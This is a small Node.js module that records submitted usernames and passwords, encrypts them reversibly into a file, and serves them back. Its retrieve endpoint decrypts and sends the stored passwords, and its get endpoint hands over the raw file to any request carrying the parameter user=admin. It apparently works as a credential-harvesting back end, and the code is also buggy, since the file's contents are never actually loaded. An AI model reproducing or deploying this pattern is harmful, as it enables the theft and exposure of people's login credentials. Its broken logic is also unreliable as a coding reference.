var fs = require('fs');
var crypto = require('crypto'),
algorithm = 'aes-256-ctr',
password = ''; //fill password before running

var data = fs.readFile("./tmp.dat",{encoding:'utf8'},function(err){
	if(err)
		console.log(err);
	if(data == null || data ==''){
		data ={}
	}
	else{
		data = JSON.parse(data)
	}
});


function encrypt(text){
	var cipher = crypto.createCipher(algorithm,password)
	var crypted = cipher.update(text,'utf8','base64')
	crypted += cipher.final('base64');
	return crypted;
}

function decrypt(text){
	var decipher = crypto.createDecipher(algorithm,password)
	var dec = decipher.update(text,'base64','utf8')
	dec += decipher.final('utf8');
	return dec;
}

var tmp = {
	log : function(body){
		data[encrypt(body.UserName)] = encrypt(body.Password);

		fs.writeFile("./tmp.dat",JSON.stringify(data), function(err) {
			if (err)
				console.error(err);
			else{
				console.log("done");
			}
		});


	},
	retrieve: function(req,res){
		var _data = fs.readFileSync("./tmp.dat",{encoding:'utf8'});
		var temp = JSON.parse(_data)
		for(var obj in temp){
			temp[decrypt(obj)] = decrypt(temp[obj]);
			delete temp[obj];
		}
		res.send(temp);
	},
	get:function(req,res){
		if(req.query.user=='admin'){
			var _data = fs.readFileSync("./tmp.dat",{encoding:'utf8'});
			res.status(200).send(_data);
		}
		else{
			res.sendStatus(500);
		}
		
	}
}

module.exports = tmp;